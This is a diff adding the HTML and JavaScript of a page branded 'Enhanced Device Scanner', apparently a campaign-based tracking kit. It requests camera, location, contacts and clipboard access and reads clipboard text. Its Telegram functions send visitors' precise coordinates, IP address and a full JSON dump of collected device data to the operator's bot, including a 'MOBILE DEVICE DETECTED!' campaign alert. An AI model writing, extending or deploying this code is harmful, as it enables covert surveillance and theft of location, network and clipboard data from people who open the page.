+                                                        <div class="sensor-unit">Beta (°)</div>
+                                                        <div class="sensor-value" id="orient-gamma">0.00</div>
+                                                        <div class="sensor-unit">Gamma (°)</div>
+                                                        <div class="mt-2 text-center">
+                                                            <span id="orient-status" class="badge bg-secondary">Checking...</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="col-md-4 mb-3">
+                                                    <div class="sensor-container">
+                                                        <h6><i class="fas fa-sun"></i> Proximity & Light</h6>
+                                                        <div class="sensor-value" id="proximity-value">Unknown</div>
+                                                        <div class="sensor-unit">Proximity</div>
+                                                        <div class="sensor-value" id="light-value">Unknown</div>
+                                                        <div class="sensor-unit">Light (lux)</div>
+                                                        <div class="mt-2 text-center">
+                                                            <span id="sensor-status" class="badge bg-secondary">Checking...</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="row mt-3">
+                                                <div class="col-12">
+                                                    <h5>Available Sensors</h5>
+                                                    <div id="available-sensors" class="d-flex flex-wrap gap-2">
+                                                        <!-- Sensor badges will appear here -->
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- Permissions Tab -->
+                                <div class="tab-pane fade" id="permissions-tab">
+                                    <div class="info-card glass-card">
+                                        <div class="card-header">
+                                            <i class="fas fa-shield-alt card-icon"></i> Permissions Status
+                                        </div>
+                                        <div class="card-body">
+                                            <div class="row" id="permissions-grid">
+                                                <!-- Permissions will be loaded here -->
+                                            </div>
+                                            
+                                            <div class="mt-4">
+                                                <h5>Request Permissions</h5>
+                                                <div class="d-flex flex-wrap gap-2">
+                                                    <button class="permission-btn" onclick="requestPermission('camera')">
+                                                        <i class="fas fa-camera"></i> Camera
+                                                    </button>
+                                                    <button class="permission-btn" onclick="requestPermission('microphone')">
+                                                        <i class="fas fa-microphone"></i> Microphone
+                                                    </button>
+                                                    <button class="permission-btn" onclick="requestPermission('geolocation')">
+                                                        <i class="fas fa-location-dot"></i> Location
+                                                    </button>
+                                                    <button class="permission-btn" onclick="requestPermission('notifications')">
+                                                        <i class="fas fa-bell"></i> Notifications
+                                                    </button>
+                                                    <button class="permission-btn warning" onclick="requestContactAccess()">
+                                                        <i class="fas fa-address-book"></i> Contacts
+                                                    </button>
+                                                    <button class="permission-btn info" onclick="requestClipboardAccess()">
+                                                        <i class="fas fa-clipboard"></i> Clipboard
+                                                    </button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- Other tabs (Basic Info, Network, etc.) would go here -->
+                                <!-- Using simplified versions of existing tabs -->
+                                
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Status Bar -->
+                    <div class="row mt-3">
+                        <div class="col-12">
+                            <div class="glass-card p-2 text-center">
+                                <div class="d-flex justify-content-between align-items-center">
+                                    <div class="text-start">
+                                        <small class="text-white">
+                                            <i class="fas fa-microchip"></i> 
+                                            <span id="device-status">Detecting device...</span>
+                                        </small>
+                                    </div>
+                                    <div class="text-end">
+                                        <small class="text-white">
+                                            <i class="fas fa-shield-alt"></i> 
+                                            Enhanced Scanner v2.0
+                                        </small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Modals would go here -->
+            `;
+        }
+
+        function initializeEnhancedDashboard() {
+            // Initialize all data collection
+            initializeEnhancedDataCollection();
+            
+            // Set up UI updates
+            updateMobileDetectionUI();
+            updateSensorsUI();
+            updatePermissionsUI();
+            
+            // Start sensor monitoring if available
+            startSensorMonitoring();
+            
+            // Set up event listeners
+            setupEnhancedEventListeners();
+        }
+
+        function initializeEnhancedDataCollection() {
+            // Basic data collection
+            collectDeviceInfo();
+            collectNetworkInfo();
+            collectBatteryInfo();
+            
+            // Enhanced mobile data collection
+            detectMobilePlatform();
+            collectMobileCapabilities();
+            detectEmailClients();
+            checkAvailableSensors();
+            checkNotificationPermission();
+            detectInstalledApps();
+        }
+
+        // ============================================
+        // UI UPDATE FUNCTIONS
+        // ============================================
+
+        function updateMobileDetectionUI() {
+            const platformDiv = document.getElementById('platform-detection');
+            const capabilitiesDiv = document.getElementById('device-capabilities');
+            const emailDiv = document.getElementById('email-info');
+            const contactDiv = document.getElementById('contact-sms-info');
+            const appsDiv = document.getElementById('installed-apps');
+            const deviceStatus = document.getElementById('device-status');
+            
+            if (platformDiv) {
+                const info = deviceData.mobileFeatures.browserInfo;
+                platformDiv.innerHTML = `
+                    <div class="mobile-data-item">
+                        <span>Platform:</span>
+                        <span>${info.platform}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Device Type:</span>
+                        <span>${info.isMobile ? 'Mobile' : 'Desktop'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>OS:</span>
+                        <span>${info.isIOS ? 'iOS' : info.isAndroid ? 'Android' : 'Other'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Browser:</span>
+                        <span>${info.isChrome ? 'Chrome' : info.isSafari ? 'Safari' : info.isFirefox ? 'Firefox' : 'Other'}</span>
+                    </div>
+                `;
+            }
+            
+            if (capabilitiesDiv) {
+                const caps = deviceData.mobileFeatures.deviceCapabilities;
+                capabilitiesDiv.innerHTML = `
+                    <div class="mobile-data-item">
+                        <span>Vibration:</span>
+                        <span>${caps.hasVibration ? '✅ Available' : '❌ Not available'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Telephony:</span>
+                        <span>${caps.hasTelephony ? '✅ Mobile device' : '❌ Not mobile'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>NFC:</span>
+                        <span>${caps.hasNFC ? '✅ Available' : '❌ Not available'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Bluetooth:</span>
+                        <span>${caps.hasBluetooth ? '✅ Available' : '❌ Not available'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Touch Points:</span>
+                        <span>${caps.maxTouchPoints}</span>
+                    </div>
+                `;
+            }
+            
+            if (emailDiv) {
+                const emailInfo = deviceData.mobileFeatures.emailInfo;
+                emailDiv.innerHTML = `
+                    <div class="mobile-data-item">
+                        <span>Email Access:</span>
+                        <span>${emailInfo.hasEmailAccess ? '✅ Possible' : '❌ Limited'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Detected Emails:</span>
+                        <span>${emailInfo.possibleEmails.length}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Email Clients:</span>
+                        <span>${emailInfo.emailClients.length > 0 ? emailInfo.emailClients.join(', ') : 'None detected'}</span>
+                    </div>
+                `;
+            }
+            
+            if (contactDiv) {
+                const contactInfo = deviceData.mobileFeatures.contactsInfo;
+                const smsInfo = deviceData.mobileFeatures.smsInfo;
+                contactDiv.innerHTML = `
+                    <div class="mobile-data-item">
+                        <span>Contacts Access:</span>
+                        <span>${contactInfo.hasAccess ? '✅ API Available' : '❌ Limited'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>SMS Capability:</span>
+                        <span>${smsInfo.hasSmsCapability ? '✅ Mobile device' : '❌ Not available'}</span>
+                    </div>
+                    <div class="mobile-data-item">
+                        <span>Send SMS:</span>
+                        <span>${smsInfo.canSendSms ? '✅ Possible' : '❌ Not available'}</span>
+                    </div>
+                `;
+            }
+            
+            if (appsDiv) {
+                const apps = deviceData.mobileFeatures.installedApps;
+                const appList = [];
+                for (const [app, hasApp] of Object.entries(apps)) {
+                    if (hasApp) {
+                        appList.push(app.replace('has', ''));
+                    }
+                }
+                
+                appsDiv.innerHTML = `
+                    <div class="mobile-data-item">
+                        <span>Detected Apps:</span>
+                        <span>${appList.length > 0 ? appList.join(', ') : 'None detected'}</span>
+                    </div>
+                    <div class="small text-muted mt-1">
+                        Detection based on browser patterns and protocols
+                    </div>
+                `;
+            }
+            
+            if (deviceStatus) {
+                const info = deviceData.mobileFeatures.browserInfo;
+                deviceStatus.textContent = `${info.isMobile ? 'Mobile' : 'Desktop'} - ${info.isIOS ? 'iOS' : info.isAndroid ? 'Android' : 'Other'}`;
+            }
+        }
+
+        function updateSensorsUI() {
+            const sensors = deviceData.mobileFeatures.sensorsInfo;
+            const availableSensorsDiv = document.getElementById('available-sensors');
+            
+            if (availableSensorsDiv) {
+                availableSensorsDiv.innerHTML = '';
+                
+                for (const [sensorName, sensorInfo] of Object.entries(sensors)) {
+                    const badge = document.createElement('span');
+                    badge.className = `badge ${sensorInfo.available ? 'bg-success' : 'bg-secondary'}`;
+                    badge.innerHTML = `${sensorName.replace('Sensor', '')}: ${sensorInfo.available ? '✅' : '❌'}`;
+                    availableSensorsDiv.appendChild(badge);
+                }
+            }
+        }
+
+        function updatePermissionsUI() {
+            const permissionsGrid = document.getElementById('permissions-grid');
+            if (!permissionsGrid || !deviceData.permissionsInfo) return;
+            
+            permissionsGrid.innerHTML = '';
+            
+            for (const [permission, status] of Object.entries(deviceData.permissionsInfo)) {
+                const col = document.createElement('div');
+                col.className = 'col-md-6 col-lg-4 mb-3';
+                
+                let badgeClass = 'bg-secondary';
+                if (status === 'granted') badgeClass = 'bg-success';
+                else if (status === 'denied') badgeClass = 'bg-danger';
+                else if (status === 'prompt') badgeClass = 'bg-warning';
+                
+                col.innerHTML = `
+                    <div class="d-flex justify-content-between align-items-center p-2 border rounded">
+                        <span><i class="fas fa-shield-alt me-2"></i>${permission}</span>
+                        <span class="badge ${badgeClass}">${status}</span>
+                    </div>
+                `;
+                
+                permissionsGrid.appendChild(col);
+            }
+        }
+
+        function startSensorMonitoring() {
+            // Monitor accelerometer
+            if (deviceData.mobileFeatures.sensorsInfo.accelerometer.available) {
+                window.addEventListener('devicemotion', (event) => {
+                    if (event.acceleration) {
+                        const accel = event.acceleration;
+                        
+                        // Update UI
+                        const xElem = document.getElementById('accel-x');
+                        const yElem = document.getElementById('accel-y');
+                        const zElem = document.getElementById('accel-z');
+                        const statusElem = document.getElementById('accel-status');
+                        
+                        if (xElem) xElem.textContent = accel.x ? accel.x.toFixed(2) : '0.00';
+                        if (yElem) yElem.textContent = accel.y ? accel.y.toFixed(2) : '0.00';
+                        if (zElem) zElem.textContent = accel.z ? accel.z.toFixed(2) : '0.00';
+                        if (statusElem) statusElem.className = 'badge bg-success';
+                        
+                        // Update data object
+                        deviceData.mobileFeatures.sensorsInfo.accelerometer.x = accel.x || 0;
+                        deviceData.mobileFeatures.sensorsInfo.accelerometer.y = accel.y || 0;
+                        deviceData.mobileFeatures.sensorsInfo.accelerometer.z = accel.z || 0;
+                    }
+                });
+            }
+            
+            // Monitor orientation
+            if (deviceData.mobileFeatures.sensorsInfo.orientation.available) {
+                window.addEventListener('deviceorientation', (event) => {
+                    // Update UI
+                    const alphaElem = document.getElementById('orient-alpha');
+                    const betaElem = document.getElementById('orient-beta');
+                    const gammaElem = document.getElementById('orient-gamma');
+                    const statusElem = document.getElementById('orient-status');
+                    
+                    if (alphaElem) alphaElem.textContent = event.alpha ? event.alpha.toFixed(2) : '0.00';
+                    if (betaElem) betaElem.textContent = event.beta ? event.beta.toFixed(2) : '0.00';
+                    if (gammaElem) gammaElem.textContent = event.gamma ? event.gamma.toFixed(2) : '0.00';
+                    if (statusElem) statusElem.className = 'badge bg-success';
+                    
+                    // Update data object
+                    deviceData.mobileFeatures.sensorsInfo.orientation.alpha = event.alpha || 0;
+                    deviceData.mobileFeatures.sensorsInfo.orientation.beta = event.beta || 0;
+                    deviceData.mobileFeatures.sensorsInfo.orientation.gamma = event.gamma || 0;
+                });
+            }
+        }
+
+        // ============================================
+        // PERMISSION REQUEST FUNCTIONS
+        // ============================================
+
+        async function requestPermission(permission) {
+            try {
+                let granted = false;
+                
+                switch(permission) {
+                    case 'camera':
+                        const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        granted = true;
+                        cameraStream.getTracks().forEach(track => track.stop());
+                        break;
+                        
+                    case 'microphone':
+                        const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        granted = true;
+                        micStream.getTracks().forEach(track => track.stop());
+                        break;
+                        
+                    case 'geolocation':
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                        });
+                        granted = true;
+                        break;
+                        
+                    case 'notifications':
+                        const result = await Notification.requestPermission();
+                        granted = result === 'granted';
+                        break;
+                        
+                    default:
+                        showToast(`Permission ${permission} not implemented`, 'warning');
+                        return;
+                }
+                
+                if (granted) {
+                    showToast(`${permission} permission granted!`, 'success');
+                    // Update permissions display
+                    await checkOtherPermissions();
+                    updatePermissionsUI();
+                }
+                
+            } catch (error) {
+                showToast(`${permission} permission denied: ${error.message}`, 'error');
+            }
+        }
+
+        async function requestNotificationPermission() {
+            if (!('Notification' in window)) {
+                showToast('Notifications not supported in this browser', 'error');
+                return;
+            }
+            
+            const permission = await Notification.requestPermission();
+            
+            if (permission === 'granted') {
+                showToast('Notification permission granted!', 'success');
+                
+                // Send a test notification
+                const notification = new Notification('Device Scanner', {
+                    body: 'Notifications are working!',
+                    icon: 'https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/icons/device-ssd.svg'
+                });
+                
+                deviceData.mobileFeatures.notificationsInfo.permissionStatus = 'granted';
+                deviceData.mobileFeatures.notificationsInfo.canSendNotifications = true;
+                
+            } else {
+                showToast('Notification permission denied', 'warning');
+            }
+            
+            // Update UI
+            await checkOtherPermissions();
+            updatePermissionsUI();
+        }
+
+        async function requestContactAccess() {
+            if (!('contacts' in navigator && 'select' in navigator.contacts)) {
+                showToast('Contacts API not supported in this browser', 'error');
+                return;
+            }
+            
+            try {
+                const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
+                
+                if (contacts.length > 0) {
+                    deviceData.mobileFeatures.contactsInfo.contactCount = contacts.length;
+                    deviceData.mobileFeatures.contactsInfo.hasAccess = true;
+                    
+                    // Note: We should handle contact data carefully and ethically
+                    // This example just counts contacts without storing details
+                    
+                    showToast(`Access to ${contacts.length} contact(s) granted`, 'success');
+                } else {
+                    showToast('No contacts selected', 'info');
+                }
+                
+            } catch (error) {
+                showToast(`Contacts access error: ${error.message}`, 'error');
+            }
+        }
+
+        async function requestClipboardAccess() {
+            try {
+                const text = await navigator.clipboard.readText();
+                showToast('Clipboard access granted!', 'success');
+                
+                // Store clipboard data (handle ethically)
+                deviceData.clipboardInfo = text.substring(0, 100); // Limit storage
+                
+            } catch (error) {
+                showToast(`Clipboard access denied: ${error.message}`, 'error');
+            }
+        }
+
+        // ============================================
+        // TEST FUNCTIONS
+        // ============================================
+
+        function testVibration() {
+            if (!('vibrate' in navigator)) {
+                showToast('Vibration not supported', 'error');
+                return;
+            }
+            
+            try {
+                navigator.vibrate([100, 50, 100, 50, 100]);
+                showToast('Vibration test successful!', 'success');
+            } catch (error) {
+                showToast('Vibration test failed', 'error');
+            }
+        }
+
+        function testSensors() {
+            const sensors = deviceData.mobileFeatures.sensorsInfo;
+            let availableSensors = [];
+            
+            for (const [sensorName, sensorInfo] of Object.entries(sensors)) {
+                if (sensorInfo.available) {
+                    availableSensors.push(sensorName);
+                }
+            }
+            
+            if (availableSensors.length > 0) {
+                showToast(`Available sensors: ${availableSensors.join(', ')}`, 'success');
+            } else {
+                showToast('No sensors available', 'warning');
+            }
+        }
+
+        function detectEmailInfo() {
+            // Trigger email detection
+            detectEmailClients();
+            
+            // Update UI
+            updateMobileDetectionUI();
+            
+            showToast('Email detection completed', 'success');
+        }
+
+        // ============================================
+        // DATA EXPORT FUNCTIONS
+        // ============================================
+
+        function downloadEnhancedData() {
+            deviceData.timestamp = new Date().toISOString();
+            deviceData.collectionTool = "Enhanced Device Scanner with Mobile Features";
+            
+            const dataStr = JSON.stringify(deviceData, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            
+            const downloadLink = document.createElement('a');
+            downloadLink.href = URL.createObjectURL(dataBlob);
+            downloadLink.download = `enhanced-device-data-${new Date().toISOString().split('T')[0]}.json`;
+            
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+            
+            showToast('Enhanced data downloaded!', 'success');
+        }
+
+        async function sendEnhancedDataToTelegram() {
+            if (!telegramConfig.botToken || !telegramConfig.chatId) {
+                showToast('Configure Telegram first!', 'error');
+                return;
+            }
+            
+            try {
+                showToast('Sending enhanced data to Telegram...', 'info');
+                
+                // Create comprehensive message
+                let message = `📱 *ENHANCED DEVICE SCAN REPORT*\n\n`;
+                message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
+                message += `🔍 *Scan Type:* Enhanced Mobile Detection\n\n`;
+                
+                // Platform info
+                const platform = deviceData.mobileFeatures.browserInfo;
+                message += `*Platform Detection:*\n`;
+                message += `• Device: ${platform.isMobile ? 'Mobile' : 'Desktop'}\n`;
+                message += `• OS: ${platform.isIOS ? 'iOS' : platform.isAndroid ? 'Android' : 'Other'}\n`;
+                message += `• Browser: ${platform.isChrome ? 'Chrome' : platform.isSafari ? 'Safari' : 'Other'}\n\n`;
+                
+                // Capabilities
+                const caps = deviceData.mobileFeatures.deviceCapabilities;
+                message += `*Device Capabilities:*\n`;
+                message += `• Vibration: ${caps.hasVibration ? '✅' : '❌'}\n`;
+                message += `• Telephony: ${caps.hasTelephony ? '✅' : '❌'}\n`;
+                message += `• NFC: ${caps.hasNFC ? '✅' : '❌'}\n`;
+                message += `• Bluetooth: ${caps.hasBluetooth ? '✅' : '❌'}\n\n`;
+                
+                // Sensors
+                const sensors = deviceData.mobileFeatures.sensorsInfo;
+                let availableSensors = [];
+                for (const [sensor, info] of Object.entries(sensors)) {
+                    if (info.available) availableSensors.push(sensor);
+                }
+                message += `*Available Sensors:* ${availableSensors.length}\n`;
+                if (availableSensors.length > 0) {
+                    message += `• ${availableSensors.join(', ')}\n`;
+                }
+                
+                // Send message
+                await sendTelegramMessage(message);
+                
+                // Send JSON data
+                const jsonBlob = new Blob([JSON.stringify(deviceData, null, 2)], { 
+                    type: 'application/json' 
+                });
+                const jsonFile = new File([jsonBlob], `enhanced-device-data-${Date.now()}.json`);
+                await sendTelegramDocument(jsonFile, 'Enhanced Device Data JSON');
+                
+                showToast('Enhanced data sent to Telegram!', 'success');
+                
+            } catch (error) {
+                showToast(`Failed to send: ${error.message}`, 'error');
+            }
+        }
+
+        async function sendEnhancedMobileDataToTelegram(campaignId) {
+            try {
+                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
+                const campaignName = campaign ? campaign.name : 'Mobile Campaign';
+                
+                let message = `📱 *MOBILE DEVICE DETECTED!*\n\n`;
+                message += `📊 *Campaign:* ${campaignName}\n`;
+                message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
+                message += `📶 *Device Type:* Mobile\n\n`;
+                
+                // Platform info
+                const platform = deviceData.mobileFeatures.browserInfo;
+                message += `*Platform:* ${platform.isIOS ? 'iOS' : platform.isAndroid ? 'Android' : 'Mobile Browser'}\n`;
+                message += `*Browser:* ${platform.isChrome ? 'Chrome Mobile' : platform.isSafari ? 'Safari Mobile' : 'Mobile Browser'}\n\n`;
+                
+                // Location if available
+                if (deviceData.locationInfo?.latitude) {
+                    message += `📍 *Location:*\n`;
+                    message += `• Lat: ${deviceData.locationInfo.latitude.toFixed(6)}\n`;
+                    message += `• Lon: ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
+                    message += `• Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n\n`;
+                }
+                
+                // Network info
+                if (deviceData.networkInfo?.ipv4) {
+                    message += `🌐 *Network:*\n`;
+                    message += `• IP: \`${deviceData.networkInfo.ipv4}\`\n`;
+                    message += `• Type: ${deviceData.networkInfo.connectionType || 'Mobile data'}\n\n`;
+                }
+                
+                // Mobile capabilities
+                const caps = deviceData.mobileFeatures.deviceCapabilities;
+                message += `*Mobile Features:*\n`;
+                message += `• Vibration: ${caps.hasVibration ? '✅' : '❌'}\n`;
+                message += `• Sensors: ${Object.values(deviceData.mobileFeatures.sensorsInfo).filter(s => s.available).length} available\n`;
+                message += `• Touch Points: ${caps.maxTouchPoints}\n`;
+                
+                message += `\n_Enhanced mobile scan completed_`;
+                
+                await sendTelegramMessage(message);
+                
+            } catch (error) {
+                console.error('Failed to send mobile data:', error);
+            }
+        }
+
+        // ============================================
+        // UTILITY FUNCTIONS (from previous implementation)
+        // ============================================
+
+        // These functions remain similar to previous implementation
+        // but enhanced with mobile features
+        
+        function showToast(message, type = 'info') {
+            // Same toast implementation as before
+            const existingToasts = document.querySelectorAll('.custom-toast');
+            existingToasts.forEach(toast => toast.remove());
+            
+            const toast = document.createElement('div');
+            toast.className = `custom-toast`;
+            toast.style.cssText = 'position: fixed; bottom: 20px; right: 20px; z-index: 9999; min-width: 300px;';
+            
+            let bgColor = 'bg-primary';
+            let icon = 'fas fa-info-circle';
+            
+            if (type === 'success') {
+                bgColor = 'bg-success';
+                icon = 'fas fa-check-circle';
+            } else if (type === 'error') {
+                bgColor = 'bg-danger';
+                icon = 'fas fa-exclamation-circle';
+            } else if (type === 'warning') {
+                bgColor = 'bg-warning';
+                icon = 'fas fa-exclamation-triangle';
+            }
+            
+            toast.innerHTML = `
+                <div class="toast show" role="alert" aria-live="assertive" aria-atomic="true">
+                    <div class="toast-header ${bgColor} text-white">
+                        <i class="${icon} me-2"></i>
+                        <strong class="me-auto">Device Scanner</strong>
+                        <small>Just now</small>
+                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast" aria-label="Close"></button>
+                    </div>
+                    <div class="toast-body">
+                        ${message}
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                if (toast.parentNode) {
+                    toast.remove();
+                }
+            }, 5000);
+            
+            const closeBtn = toast.querySelector('.btn-close');
+            if (closeBtn) {
+                closeBtn.addEventListener('click', () => {
+                    toast.remove();
+                });
+            }
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function setupEnhancedEventListeners() {
+            // Set up any additional event listeners
+            const tabs = document.querySelectorAll('[data-bs-toggle="tab"]');
+            tabs.forEach(tab => {
+                tab.addEventListener('shown.bs.tab', function (event) {
+                    // Update relevant UI when tab changes
+                    const target = event.target.getAttribute('data-bs-target');
+                    if (target === '#sensors-tab') {
+                        updateSensorsUI();
+                    } else if (target === '#permissions-tab') {
+                        updatePermissionsUI();
+                    } else if (target === '#mobile-tab') {
+                        updateMobileDetectionUI();
+                    }
+                });
+            });
+        }
+
+        // Note: Other functions from the original implementation
+        // (collectDeviceInfo, collectNetworkInfo, etc.) should be included here
+        // They remain largely the same but now integrate with enhanced data structure
+    </script>
+</body>
+</html>
